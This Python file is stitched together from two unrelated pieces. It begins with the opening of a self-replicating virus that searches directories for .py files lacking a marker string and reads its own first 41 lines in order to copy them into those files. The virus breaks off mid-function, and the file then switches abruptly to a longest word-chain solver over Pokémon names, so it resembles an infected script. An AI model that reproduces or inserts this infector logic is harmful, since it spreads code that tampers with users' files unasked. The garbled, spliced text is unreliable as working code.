import os, datetime, inspect

DATA_TO_INSERT = "GEEKSFORGEEKS"


# search for target files in path
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for filename in filelist:

        # If it is a folder
        if os.path.isdir(path + "/" + filename):
            filestoinfect.extend(search(path + "/" + filename))

            # If it is a python script -> Infect it
        elif filename[-3:] == ".py":

            # default value
            infected = False
            for line in open(path + "/" + filename):
                if DATA_TO_INSERT in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path + "/" + filename)
    return filestoinfect


# changes to be made in the target file
def infect(filestoinfect):
    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    virusstring = ""
    for i, line in enumerate(virus):
        if i >= 0 and i < 41:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
from collections import defaultdict
# here i use import defaultdict from colection

def order_words(words):

    byfirst = defaultdict(set)

    for word in words:
        byfirst[word[0]].add(word)

    return byfirst


def linkfirst(byfirst, sofar):

    assert sofar
    chmatch = sofar[-1][-1]
    options = byfirst[chmatch] - set(sofar)
    if not options:

        return sofar

    else:
        alternatives = (linkfirst(byfirst, list(sofar) + [word])
                        for word in options)
        mx = max(alternatives, key=len)

        return mx


def shiri(words):

    byfirst = order_words(words)

    return max((linkfirst(byfirst, [word]) for word in words), key=len)


if __name__ == '__main__':
    pokemon = """audino bagon baltoy banette bidoof braviary bronzor carracosta charmeleon
cresselia croagunk darmanitan deino emboar emolga exeggcute gabite
girafarig gulpin haxorus heatmor heatran ivysaur jellicent jumpluff kangaskhan
kricketune landorus ledyba loudred lumineon lunatone machamp magnezone mamoswine
nosepass petilil pidgeotto pikachu pinsir poliwrath poochyena porygon2
porygonz registeel relicanth remoraid rufflet sableye scolipede scrafty seaking
sealeo silcoon simisear snivy snorlax spoink starly tirtouga trapinch treecko
tyrogue vigoroth vulpix wailord wartortle whismur wingull yamask"""
    
    pokemon = pokemon.strip().lower().split()
    pokemon = sorted(set(pokemon))
    l = shiri(pokemon)
    for i in range(0, len(l), 8): print(' '.join(l[i:i + 8]))
    print(len(l))